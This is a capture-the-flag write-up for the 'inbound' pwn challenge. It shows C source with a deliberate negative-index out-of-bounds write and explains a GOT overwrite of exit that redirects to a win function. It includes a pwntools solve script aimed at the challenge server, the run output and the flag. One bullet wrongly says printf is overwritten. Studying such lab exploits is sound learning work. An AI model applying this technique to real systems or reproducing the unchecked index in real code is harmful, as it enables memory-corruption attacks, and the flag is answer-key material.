# inbound : Pwn

inside-of-bounds

Attachment  
[inbound.tar.gz](inbound.tar.gz)  

Tags : Out-of-Bounds Write, GOT Overflow, Win Function  
Author : ptr-yudai

# Solution

Check the source code.
```c main.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int slot[10];

/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}

int main() {
  int index, value;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  printf("index: ");
  scanf("%d", &index);
  if (index >= 10) {
    puts("[-] out-of-bounds");
    exit(1);
  }

  printf("value: ");
  scanf("%d", &value);

  slot[index] = value;

  for (int i = 0; i < 10; i++)
    printf("slot[%d] = %d\n", i, slot[i]);

  exit(0);
}
```
This code reveals the existence of win().  
In addition, we can pass the bounds check if the index value is less than 10.
```
$ checksec inbound
[*] '/home/colza/inbound'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
The apploach is as follows:
* Specified negative number as the index and reference GOT address of `exit` because we can write only 4bytes and printf address is 6bytes(libc).
* Overwirte the `printf` address to the `win` address.

The `exit` address of GOT is located at `0x404028`. And, slot list is located at `0x404060`. So, offset from list to `exit` of GOT is `0x38`.
```
$ readelf -a inbound
...
000000404028  000800000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
...
    18: 0000000000404060    40 OBJECT  GLOBAL DEFAULT   26 slot
```
The `slot` list is int type, so index is `0x38 / 0x4 = 14`.

The steps are as follows:
 * input `-14` as index
 * input `win` address as value

Execution code below:
```python solve.py
from pwn import *

elf = ELF("./inbound")

p = remote("34.170.146.252", 42647)

p.sendlineafter(b"index: ", b"-14")

win_addr = elf.symbols["win"]

p.sendlineafter(b"value: ", str(win_addr).encode())

p.interactive()
```
Execute it.
```
$ python3 solve.py
[*] '/home/colza/inbound'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 34.170.146.252 on port 42647: Done
[*] Switching to interactive mode
slot[0] = 0
slot[1] = 0
slot[2] = 0
slot[3] = 0
slot[4] = 0
slot[5] = 0
slot[6] = 0
slot[7] = 0
slot[8] = 0
slot[9] = 0
Alpaca{p4rt14L_RELRO_1s_A_h4pPy_m0m3Nt}
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 34.170.146.252 port 42647
[*] Got EOF while sending in interactive
```

Get the flag!

`Alpaca{p4rt14L_RELRO_1s_A_h4pPy_m0m3Nt}`
